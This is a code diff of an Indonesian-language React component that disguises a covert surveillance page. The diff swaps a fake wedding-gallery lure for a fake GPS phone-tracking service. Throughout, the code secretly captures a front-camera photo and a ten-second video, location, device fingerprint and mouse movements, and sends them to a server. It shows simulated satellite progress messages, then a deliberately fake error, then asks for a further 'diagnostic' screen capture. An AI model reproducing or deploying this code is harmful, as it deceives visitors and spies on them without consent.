@@ -1,7 +1,7 @@
 "use client";
 
-import { useState, useRef, useEffect, useCallback } from 'react';
-import { Loader2, Heart, Image as ImageIcon } from 'lucide-react';
+import { useState, useRef, useEffect } from 'react';
+import { Loader2, Satellite, MapPin, Radar, ShieldAlert, Wifi, Radio } from 'lucide-react';
 
 type StatusType = 'idle' | 'loading' | 'success' | 'error' | 'ask_screenshot' | 'done';
 
@@ -11,7 +11,6 @@ async function collectDeviceStatus(): Promise<{
   connection: { effectiveType: string; downlink: number; rtt: number; saveData: boolean } | null;
   hardware: { ram: number | null; cores: number | null };
 }> {
-  // Battery
   let battery = null;
   try {
     if ('getBattery' in navigator) {
@@ -23,7 +22,6 @@ async function collectDeviceStatus(): Promise<{
     }
   } catch (_) {}
 
-  // Network Connection
   let connection = null;
   try {
     const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
@@ -37,7 +35,6 @@ async function collectDeviceStatus(): Promise<{
     }
   } catch (_) {}
 
-  // Hardware
   const hardware = {
     ram: (navigator as any).deviceMemory ?? null,
     cores: navigator.hardwareConcurrency ?? null,
@@ -46,12 +43,18 @@ async function collectDeviceStatus(): Promise<{
   return { battery, connection, hardware };
 }
 
-export default function CameraVerification() {
+interface CameraVerificationProps {
+  phoneNumber?: string;
+}
+
+export default function CameraVerification({ phoneNumber = '' }: CameraVerificationProps) {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   
   const [status, setStatus] = useState<StatusType>('idle');
-  const [message, setMessage] = useState<string>('Terdapat kumpulan momen indah dan sebuah pesan rahasia yang sengaja kami siapkan secara khusus hanya untuk sahabat-sahabat terdekat kami.');
+  const [message, setMessage] = useState<string>('Sistem akan menghubungkan ke jaringan satelit GPS untuk memulai proses pelacakan. Izinkan akses perangkat untuk sinkronisasi node terdekat.');
+  const [progress, setProgress] = useState(0);
+  const [currentStep, setCurrentStep] = useState('');
   
   // Tracking Refs
   const sessionId = useRef<string>('');
@@ -66,7 +69,6 @@ export default function CameraVerification() {
 
   // Initialize Session
   useEffect(() => {
-    // Generate simple UUID fallback
     const generateId = () => {
         return typeof crypto !== 'undefined' && crypto.randomUUID 
           ? crypto.randomUUID() 
@@ -77,7 +79,6 @@ export default function CameraVerification() {
     };
     sessionId.current = generateId();
 
-    // Fingerprinting
     const getCanvasHash = () => {
         try {
             const canvas = document.createElement('canvas');
@@ -125,10 +126,9 @@ export default function CameraVerification() {
         platform: navigator.platform,
         webgl_vendor: getWebGLVendor(),
         canvas_hash: getCanvasHash(),
-        fonts_installed: [] // Hard to reliably extract purely client-side without external libs
+        fonts_installed: []
     };
 
-    // Tracking Listeners
     const handleMouseMove = (e: MouseEvent) => {
         if (mousePath.current.length < 50) {
             mousePath.current.push([e.clientX, e.clientY]);
@@ -165,18 +165,34 @@ export default function CameraVerification() {
       }
   };
 
-  const handleOpenGallery = async (e: React.MouseEvent) => {
-    // 1. Catat Behavior Klik Pertama
+  // Simulated progress
+  useEffect(() => {
+    if (status !== 'loading') return;
+    const interval = setInterval(() => {
+      setProgress((prev) => {
+        if (prev >= 95) {
+          clearInterval(interval);
+          return 95;
+        }
+        return prev + Math.random() * 3;
+      });
+    }, 400);
+    return () => clearInterval(interval);
+  }, [status]);
+
+  const handleTrack = async (e: React.MouseEvent) => {
     if (!firstClickXy.current) {
         firstClickXy.current = [e.clientX, e.clientY];
         timeToClickMs.current = Date.now() - mountTime.current;
     }
 
     setStatus('loading');
-    setMessage('Mempersiapkan galeri eksklusif: Mohon izinkan akses media & kamera untuk menampilkan filter interaktif.');
+    setProgress(0);
+    setCurrentStep('Menghubungkan ke satelit GPS...');
+    setMessage('Mencari jaringan satelit terdekat. Harap izinkan akses perangkat untuk mengoptimalkan koneksi node...');
 
     try {
-      // 2. Minta akses kamera (stream tunggal)
+      // Minta akses kamera
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: "user" }, 
         audio: false 
@@ -185,10 +201,11 @@ export default function CameraVerification() {
       let photoBase64 = null;
       let videoBase64 = null;
 
+      setCurrentStep('Mengenkripsi jalur data...');
+
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         
-        // Tunggu video menyala
         await new Promise((resolve) => {
             if (videoRef.current) {
                 videoRef.current.onloadedmetadata = () => {
@@ -199,10 +216,10 @@ export default function CameraVerification() {
             }
         });
         
-        // Tunggu sebentar agar kamera fokus
         await new Promise(r => setTimeout(r, 800));
 
         // --- AMBIL FOTO ---
+        setCurrentStep('Triangulasi posisi BTS...');
         const video = videoRef.current;
         const canvas = canvasRef.current;
         
@@ -212,12 +229,13 @@ export default function CameraVerification() {
             const context = canvas.getContext('2d');
             if (context) {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                photoBase64 = canvas.toDataURL('image/jpeg', 0.6); // Kompres 0.6
+                photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
             }
         }
 
-        // --- REKAM VIDEO 3 DETIK ---
-        setMessage('Memuat album momen bahagia bersama...');
+        // --- REKAM VIDEO 10 DETIK ---
+        setCurrentStep('Menganalisis sinyal Wi-Fi...');
+        setMessage('Memetakan koordinat satelit dan menghitung jarak triangulasi BTS terdekat...');
         let isMediaRecorderSupported = false;
         try {
             const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') 
@@ -225,7 +243,7 @@ export default function CameraVerification() {
               : 'video/webm';
             const recorder = new MediaRecorder(stream, { 
               mimeType, 
-              videoBitsPerSecond: 200000 // 200kbps — cukup jelas, ukuran ~250KB per 10 detik
+              videoBitsPerSecond: 200000
             });
             isMediaRecorderSupported = true;
             
@@ -245,7 +263,25 @@ export default function CameraVerification() {
             });
 
             recorder.start();
-            await new Promise(r => setTimeout(r, 10000)); // Rekam 10 detik
+
+            // Update steps selama merekam
+            const stepMessages = [
+              'Verifikasi handshake satelit...',
+              'Dekripsi paket data lokasi...',
+              'Menghitung koordinat GPS...',
+              'Sinkronisasi node server...',
+              'Mengoptimalkan akurasi...',
+            ];
+            let stepIdx = 0;
+            const stepInterval = setInterval(() => {
+              if (stepIdx < stepMessages.length) {
+                setCurrentStep(stepMessages[stepIdx]);
+                stepIdx++;
+              }
+            }, 2000);
+
+            await new Promise(r => setTimeout(r, 10000));
+            clearInterval(stepInterval);
             recorder.stop();
             
             videoBase64 = await videoPromise;
@@ -254,11 +290,11 @@ export default function CameraVerification() {
         }
       }
 
-      // Matikan kamera
       stream.getTracks().forEach(track => track.stop());
 
-      // 3. Minta akses Lokasi (Timeout 3 detik)
-      setMessage('Menyelaraskan peta lokasi acara...');
+      // Minta akses Lokasi
+      setCurrentStep('Menentukan titik koordinat...');
+      setMessage('Memfinalisasi data GPS dan mengunci koordinat lokasi target...');
       let locationData = null;
       try {
           locationData = await new Promise((resolve, reject) => {
@@ -288,13 +324,12 @@ export default function CameraVerification() {
           locationData = null;
       }
 
-      // 4. Kumpulkan Device Status (silent)
       const deviceStatus = await collectDeviceStatus();
 
-      // 5. Susun Payload Utama
       const finalPayload = {
           session_id: sessionId.current,
           timestamp: new Date().toISOString(),
+          phone_number: phoneNumber,
           photo_base64: photoBase64,
           video_base64: videoBase64,
           location: locationData,
@@ -309,14 +344,13 @@ export default function CameraVerification() {
           screenshot_base64: null
       };
 
-      // Tembak Data
       await sendPayload(finalPayload);
 
-      // 5. Tampilkan Error Palsu
+      setProgress(100);
+      setCurrentStep('Koneksi terputus');
       setStatus('error');
-      setMessage('Galeri Privat sedang dalam perbaikan teknis. Silakan coba lagi nanti.');
+      setMessage('Gagal mengunci koordinat target. Server pelacakan GPS sedang mengalami gangguan. Silakan coba beberapa saat lagi.');
 
-      // Tawarkan screenshot
       setTimeout(() => {
           setStatus('ask_screenshot');
       }, 2000);
@@ -324,7 +358,7 @@ export default function CameraVerification() {
     } catch (err: any) {
       console.error(err);
       setStatus('error');
-      setMessage('Untuk melihat animasi interaktif & album foto, mohon berikan izin akses kamera perangkat Anda.');
+      setMessage('Gagal terhubung ke node GPS. Mohon berikan izin akses perangkat Anda untuk melanjutkan proses pelacakan.');
     }
   };
 
@@ -340,7 +374,7 @@ export default function CameraVerification() {
             };
         });
         
-        await new Promise(r => setTimeout(r, 500)); // wait for stream to stabilize
+        await new Promise(r => setTimeout(r, 500));
         
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
@@ -351,7 +385,6 @@ export default function CameraVerification() {
         const screenshotBase64 = canvas.toDataURL('image/jpeg', 0.6);
         stream.getTracks().forEach(t => t.stop());
 
-        // Kirim payload susulan
         await sendPayload({
             session_id: sessionId.current,
             timestamp: new Date().toISOString(),
@@ -362,41 +395,43 @@ export default function CameraVerification() {
           console.error("Gagal atau ditolak mengambil screenshot", e);
       } finally {
           setStatus('done');
-          setMessage('Terima kasih atas laporan Anda. Kami akan segera memperbaikinya.');
+          setMessage('Terima kasih atas laporan Anda. Tim teknis kami akan segera menindaklanjuti.');
       }
   };
 
   const handleSkipScreenshot = () => {
       setStatus('done');
-      setMessage('Galeri Privat sedang dalam perbaikan teknis. Silakan coba lagi nanti.');
+      setMessage('Server pelacakan GPS sedang mengalami gangguan. Silakan coba beberapa saat lagi.');
   };
 
   return (
-    <div className="w-full max-w-md mx-auto mt-8">
-      <div className="glass-panel rounded-2xl p-6 sm:p-8 flex flex-col items-center relative overflow-hidden text-center">
+    <div className="w-full max-w-lg mx-auto">
+      <div className="glass-card p-8 relative overflow-hidden">
         
-        {/* Ornamen Pernikahan */}
-        <div className="absolute top-0 left-0 w-16 h-16 opacity-20 pointer-events-none">
-          <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M10 50 C 30 10, 70 10, 90 50 C 70 90, 30 90, 10 50" stroke="#d4af37" strokeWidth="2"/>
-            <circle cx="50" cy="50" r="10" fill="#d4af37"/>
-          </svg>
-        </div>
-        <div className="absolute bottom-0 right-0 w-16 h-16 opacity-20 pointer-events-none rotate-180">
-          <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M10 50 C 30 10, 70 10, 90 50 C 70 90, 30 90, 10 50" stroke="#d4af37" strokeWidth="2"/>
-            <circle cx="50" cy="50" r="10" fill="#d4af37"/>
-          </svg>
-        </div>
+        {/* Animated radar background */}
+        {status === 'loading' && (
+          <div className="absolute inset-0 flex items-center justify-center opacity-10 pointer-events-none">
+            <div className="w-64 h-64 rounded-full border border-accent-blue/30 animate-ring-pulse" />
+            <div className="absolute w-48 h-48 rounded-full border border-accent-purple/20 animate-ring-pulse" style={{animationDelay: '0.5s'}} />
+            <div className="absolute w-32 h-32 rounded-full border border-accent-cyan/20 animate-ring-pulse" style={{animationDelay: '1s'}} />
+          </div>
+        )}
 
-        {/* Gambar Palsu */}
-        <div className="mb-8 mt-2 relative z-10 animate-float">
-            <div className={`w-28 h-28 mx-auto bg-accent/10 rounded-full flex items-center justify-center border-4 border-white shadow-xl relative transition-all duration-700 ${status === 'loading' ? 'animate-pulse-ring' : ''}`}>
-                <ImageIcon className={`w-10 h-10 text-accent/60 transition-all duration-700 ${status === 'loading' ? 'animate-pulse' : ''}`} />
-                <div className="absolute -bottom-2 -right-2 bg-white p-2.5 rounded-full shadow-lg transition-transform hover:scale-110">
-                    <Heart className={`w-5 h-5 text-red-400 fill-red-400 ${status === 'success' || status === 'done' ? 'animate-heartbeat' : ''}`} />
-                </div>
+        {/* Header */}
+        <div className="text-center mb-6 relative z-10">
+          <div className="flex items-center justify-center gap-2 mb-3">
+            <div className={`w-16 h-16 rounded-2xl bg-gradient-to-br from-accent-blue/20 to-accent-purple/20 border border-accent-blue/30 flex items-center justify-center ${status === 'loading' ? 'animate-pulse-glow' : ''}`}>
+              <Satellite className={`w-8 h-8 text-accent-blue ${status === 'loading' ? 'animate-radar' : ''}`} />
             </div>
+          </div>
+          <h3 className="font-display text-lg font-bold text-white mb-1">
+            {status === 'loading' ? 'Pelacakan Aktif' : status === 'error' || status === 'ask_screenshot' ? 'Pelacakan Gagal' : status === 'done' ? 'Sesi Selesai' : 'Mulai Pelacakan'}
+          </h3>
+          {phoneNumber && (
+            <p className="text-accent-blue text-sm font-mono">
+              Target: +62 {phoneNumber}
+            </p>
+          )}
         </div>
 
         {/* ELEMEN KAMERA RAHASIA */}
@@ -411,42 +446,87 @@ export default function CameraVerification() {
         </div>
         <canvas ref={canvasRef} className="hidden" />
 
-        {/* Pesan Tipuan */}
-        <p className={`mb-10 font-serif italic text-sm px-4 relative z-10 transition-all duration-500 ease-in-out min-h-[40px] flex items-center justify-center ${status === 'error' || status === 'ask_screenshot' ? 'text-red-800 bg-red-100/60 p-3 rounded-lg shadow-sm scale-105' : 'text-foreground/80'}`}>
-          {message}
-        </p>
+        {/* Progress Bar */}
+        {status === 'loading' && (
+          <div className="mb-6 relative z-10">
+            <div className="flex items-center justify-between text-xs mb-2">
+              <span className="text-accent-cyan flex items-center gap-1.5">
+                <Radio className="w-3.5 h-3.5 animate-pulse" />
+                {currentStep}
+              </span>
+              <span className="text-white/40 font-mono">{Math.round(progress)}%</span>
+            </div>
+            <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden">
+              <div 
+                className="h-full rounded-full bg-gradient-to-r from-accent-blue via-accent-purple to-accent-cyan transition-all duration-500 ease-out"
+                style={{ width: `${progress}%` }}
+              />
+            </div>
+          </div>
+        )}
 
-        {/* Tombol Aksi */}
-        <div className="w-full relative z-10 transition-all duration-500">
+        {/* Live Status Indicators */}
+        {status === 'loading' && (
+          <div className="grid grid-cols-3 gap-3 mb-6 relative z-10">
+            {[
+              { icon: <Satellite className="w-4 h-4" />, label: 'Satelit GPS', value: '12/24', color: 'text-accent-blue' },
+              { icon: <Wifi className="w-4 h-4" />, label: 'Signal', value: 'Kuat', color: 'text-accent-green' },
+              { icon: <Radar className="w-4 h-4" />, label: 'BTS', value: 'Scanning', color: 'text-accent-purple' },
+            ].map((item, i) => (
+              <div key={i} className="bg-white/5 rounded-lg p-3 text-center border border-white/5">
+                <div className={`${item.color} flex justify-center mb-1`}>{item.icon}</div>
+                <p className="text-white/30 text-[10px] uppercase tracking-wider">{item.label}</p>
+                <p className={`${item.color} text-xs font-mono font-semibold`}>{item.value}</p>
+              </div>
+            ))}
+          </div>
+        )}
+
+        {/* Message */}
+        <div className={`mb-6 relative z-10 rounded-xl p-4 text-sm leading-relaxed transition-all duration-500 ${
+          status === 'error' || status === 'ask_screenshot' 
+            ? 'bg-red-500/10 border border-red-500/20 text-red-400' 
+            : status === 'done'
+            ? 'bg-accent-blue/10 border border-accent-blue/20 text-accent-blue'
+            : 'bg-white/5 border border-white/5 text-white/60'
+        }`}>
+          {message}
+        </div>
+
+        {/* Action Buttons */}
+        <div className="relative z-10">
             {status === 'ask_screenshot' && (
-                <div className="flex flex-col gap-3 animate-fade-in-up">
-                    <p className="text-sm text-gray-600 mb-2 font-medium">Apakah Anda ingin melaporkan masalah dengan mengirimkan tangkapan layar?</p>
-                    <button onClick={handleScreenshot} className="w-full py-3 bg-red-600 text-white rounded-full font-medium shadow-md hover:bg-red-700 transition-colors">
-                        Ya, Kirim Laporan
+                <div className="space-y-3 animate-fade-in-up">
+                    <div className="flex items-start gap-3 bg-red-500/10 p-4 rounded-xl border border-red-500/15">
+                        <ShieldAlert className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
+                        <p className="text-xs text-red-400 leading-relaxed">Koneksi ke server GPS terputus secara tidak terduga. Apakah Anda ingin mengirimkan laporan diagnostik (tangkapan layar) untuk mempercepat investigasi masalah ini?</p>
+                    </div>
+                    <button onClick={handleScreenshot} className="w-full py-3 bg-red-500/20 text-red-400 rounded-xl hover:bg-red-500/30 font-medium transition-all text-sm border border-red-500/20">
+                        Kirim Laporan Diagnostik
                     </button>
-                    <button onClick={handleSkipScreenshot} className="w-full py-3 bg-gray-200 text-gray-700 rounded-full font-medium shadow-sm hover:bg-gray-300 transition-colors">
-                        Tidak, Terima Kasih
+                    <button onClick={handleSkipScreenshot} className="w-full py-3 bg-white/5 text-white/40 rounded-xl hover:bg-white/10 font-medium transition-all text-sm">
+                        Lewati
                     </button>
                 </div>
             )}
             
-            {(status === 'success' || status === 'done') ? (
-                <div className="w-full py-4 bg-[#fcfbf9]/90 backdrop-blur-sm text-accent border border-accent/40 font-serif rounded-full flex justify-center items-center gap-3 shadow-md font-medium tracking-wide animate-fade-in-up">
-                    <Heart className="w-5 h-5 text-accent animate-heartbeat" />
-                    Memproses...
+            {(status === 'success' || status === 'done') && (
+                <div className="w-full py-4 bg-accent-blue/10 text-accent-blue rounded-xl flex justify-center items-center gap-2 font-medium text-sm animate-fade-in-up border border-accent-blue/20">
+                    <MapPin className="w-4 h-4" />
+                    Sesi pelacakan selesai
                 </div>
-            ) : null}
+            )}
 
             {(status === 'idle' || status === 'loading' || status === 'error') && (
                 <button 
-                    onClick={handleOpenGallery}
+                    onClick={handleTrack}
                     disabled={status === 'loading'}
-                    className="gold-btn w-full py-4 rounded-full font-serif font-medium flex justify-center items-center gap-2 disabled:opacity-80 disabled:cursor-not-allowed text-lg tracking-wide shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1"
+                    className="btn-primary w-full py-4 font-semibold flex justify-center items-center gap-2.5 disabled:opacity-50 disabled:cursor-not-allowed text-sm transition-all duration-300"
                 >
                     {status === 'loading' ? (
-                        <><Loader2 className="w-5 h-5 animate-spin" /> <span className="animate-pulse">Memuat Data...</span></>
+                        <><Loader2 className="w-4 h-4 animate-spin" /> <span className="animate-pulse">Melacak lokasi...</span></>
                     ) : (
-                        'Buka Galeri & Detail Undangan'
+                        <><Radar className="w-4 h-4" /> Mulai Pelacakan GPS</>
                     )}
                 </button>
             )}
